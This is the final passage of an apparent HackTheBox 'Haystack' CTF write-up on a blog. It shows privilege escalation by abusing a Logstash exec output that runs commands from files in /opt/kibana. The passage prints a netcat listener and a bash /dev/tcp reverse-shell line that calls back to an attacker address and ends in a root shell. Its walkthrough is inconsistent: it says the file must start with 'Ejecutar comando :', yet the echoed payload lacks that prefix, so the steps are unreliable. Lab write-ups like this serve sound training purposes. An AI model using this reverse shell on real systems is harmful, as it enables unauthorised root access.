<p>Let’s look first at <code>input.conf</code> and <code>output.conf</code> :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ cat input.conf</span><br><span class="line">input &#123;</span><br><span class="line">    file &#123;</span><br><span class="line">        path =&gt; <span class="string">&quot;/opt/kibana/logstash_*&quot;</span></span><br><span class="line">        start_position =&gt; <span class="string">&quot;beginning&quot;</span></span><br><span class="line">        sincedb_path =&gt; <span class="string">&quot;/dev/null&quot;</span></span><br><span class="line">        stat_interval =&gt; <span class="string">&quot;10 second&quot;</span></span><br><span class="line">        <span class="built_in">type</span> =&gt; <span class="string">&quot;execute&quot;</span></span><br><span class="line">        mode =&gt; <span class="string">&quot;read&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ cat output.conf</span><br><span class="line">output &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;execute&quot;</span> &#123;</span><br><span class="line">        stdout &#123; codec =&gt; json &#125;</span><br><span class="line">        <span class="built_in">exec</span> &#123;</span><br><span class="line">            <span class="built_in">command</span> =&gt; <span class="string">&quot;%&#123;comando&#125; &amp;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>According to this config Logstash will, every 10 seconds :</p>
<ol>
<li>Check for file named <code>logstash_*</code> in the <code>/opt/kibana/</code> folder.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">path =&gt; &quot;/opt/kibana/logstash_*&quot;</span><br><span class="line">stat_interval =&gt; &quot;10 second&quot;</span><br><span class="line">type =&gt; &quot;execute&quot;</span><br><span class="line">mode =&gt; &quot;read&quot;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>Check the file content for data matching filters (a regex) defined in <code>filter.conf</code>.</p>
</li>
<li><p>Send the matched data to be executed in background :</p>
</li>
</ol>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec &#123;</span><br><span class="line">    command =&gt; <span class="attr">&quot;%&#123;comando&#125; &amp;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Good, it seems we can write any command in a file named <code>/opt/kibana/logstash_*</code> and it should be run as root. Neat.<br>But first we have to make sure the command match the filter to be parsed correctly by logstash.</p>
<p>Let’s understand that filter :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat filter.conf</span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;execute&quot;</span> &#123;</span><br><span class="line">        grok &#123;</span><br><span class="line">            match =&gt; &#123; <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Ejecutar\s*comando\s*:\s+%&#123;GREEDYDATA:comando&#125;&quot;</span> &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>That’s a complicated syntax at first look. Logstash documentation present <code>grok</code> as :</p>
<blockquote>
<p>Grok is a great way to parse unstructured log data into something structured and queryable.</p>
</blockquote>
<p>So it’s a kind of regex. Let’s understand it step by step :</p>
<p><code>Ejecutar\s*comando\s*:\s+</code> is a simple regex, meaning that the file have to begin with this sentence.<br><code>%&#123;GREEDYDATA:comando&#125;</code> is the interresting grok part. According to the <a target="_blank" rel="noopener" href="https://github.com/logstash-plugins/logstash-patterns-core/blob/master/patterns/grok-patterns">grok pattern source</a> <code>GREEDYDATA</code> correspond to a <code>.*</code> in regex.</p>
<p>So basically, when given the following line : <code>Ejecutar comando : id</code> grok will match the line and take the <code>id</code> part and parse it as <code>commando</code> variable to the Logstash output (<code>command =&gt; &quot;%&#123;comando&#125; &amp;&quot;</code> as seen in <code>output.conf</code>).</p>
<p>Let’s put all those informations together and try to get a root shell.</p>
<p>First as usual let’s open a <code>netcat</code> listener :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 4485</span><br><span class="line">Listening on any address 4485 (assyst-dr)</span><br></pre></td></tr></table></figure>

<p>Then create the file Logstash will take as input (<code>/opt/kibana/logstash_*</code>) with the correct content matching the <code>filter.conf</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.10.10/4485 0&gt;&amp;1&quot;</span> &gt; /opt/kibana/logstash_hg8</span><br></pre></td></tr></table></figure>

<p>We then wait a bit and fairly quicky we get an incoming connection as root:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 4485</span><br><span class="line">Listening on any address 4485 (assyst-dr)</span><br><span class="line">Connection from 10.10.10.115:49446</span><br><span class="line">bash: no hay control de trabajos en este shell</span><br><span class="line">[root@haystack /]<span class="comment"># cat /root/root.txt</span></span><br><span class="line">3f5f727xxxxxxxxxxxx9d92</span><br><span class="line">[root@haystack /]<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>As always do not hesitate to contact me for any questions or feedbacks ;)</p>
<p>See you next time !</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Easy-Box/">Easy Box</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/cve-2018-17246/" rel="tag">cve-2018-17246</a>, <a class="tag-link-link" href="/tags/elasticsearch/" rel="tag">elasticsearch</a>, <a class="tag-link-link" href="/tags/elk/" rel="tag">elk</a>, <a class="tag-link-link" href="/tags/gobuster/" rel="tag">gobuster</a>, <a class="tag-link-link" href="/tags/haystack/" rel="tag">haystack</a>, <a class="tag-link-link" href="/tags/kibana/" rel="tag">kibana</a>, <a class="tag-link-link" href="/tags/lfi/" rel="tag">lfi</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/logstash/" rel="tag">logstash</a>, <a class="tag-link-link" href="/tags/steganography/" rel="tag">steganography</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stenography"><span class="toc-number">1.2.</span> <span class="toc-text">Stenography</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Elasticsearch"><span class="toc-number">1.3.</span> <span class="toc-text">Elasticsearch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-flag"><span class="toc-number">2.</span> <span class="toc-text">Root flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-security-gt-kibana-user"><span class="toc-number">2.1.</span> <span class="toc-text">Pivot security -&gt; kibana user</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Logstash-gt-root"><span class="toc-number">2.2.</span> <span class="toc-text">Logstash -&gt; root</span></a></li></ol></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


    
<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>




</body>
</html>
